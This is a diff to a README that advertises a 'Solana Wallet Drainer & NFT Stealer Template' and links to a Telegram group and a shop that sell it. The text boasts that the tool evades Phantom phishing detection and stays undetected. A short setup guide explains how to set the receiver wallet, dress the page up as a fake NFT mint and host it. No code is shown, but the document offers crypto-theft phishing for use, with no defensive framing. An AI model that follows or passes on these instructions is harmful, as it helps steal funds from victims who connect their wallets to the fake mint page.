@@ -1,13 +1,34 @@
+![welcome](https://i.ibb.co/tcFW9Yz/58aff1cf829958a978a4a6cb.png)
+
+### 🖖 Join us here: [https://t.me/zefnftservices]
+
+----
+## 🤑 Solana Wallet Drainer & NFT Stealer Template
+
+![@zefnftservices](https://github.com/0xServices/0xServices/blob/main/doge.gif?raw=true)
+----
+
+## 📌 Features
+- [x] Inspect Element Detection
+- [x] No API needed
+- [x] Undetected
+- [x] Full Customisable & Cool Design
+- [x] Instant transactions
+- [x] No contract required
+- [x] Anti Phantom Phishing Detections
+
+## 📂 Setup Guide
+You need to edit the **settings.js** file to change the solana receiver wallet.
+
+- open all images folders and put your project images, but rename name as it was before.
+- open index.html, to edit the project discord & twitter link, how many mints left or total supply and the project name also.
+
+After it, you're done. You only need to host the website to any hosting service
+
+To get instant support, contact us on [Telegram](https://t.me/zefnftservices)
 
 
-<div id="header" align="center">
-  <img src="https://media0.giphy.com/media/xT9IgH0fInLY2LCDPa/giphy.gif?cid=ecf05e479sqsiuhybozlv3ib5fl5w7f5ujuuzbr021ef8mvh&rid=giphy.gif&ct=g" width="400"/>
-</div>
-📩 Join us here: https://t.me/zefnftservices
-<hr>
-# SOLANA/NFT DRAINER STEALER PAGE
+## 📍 Socials
 
-<div id="header" align="center">
-  <img src="https://imgur.com/k7SLR9E" width="400"/>
-</div>
-
+- Telegram Group: https://t.me/zefnftservices
+- Shop: https://zefnftservices.sellix.io/
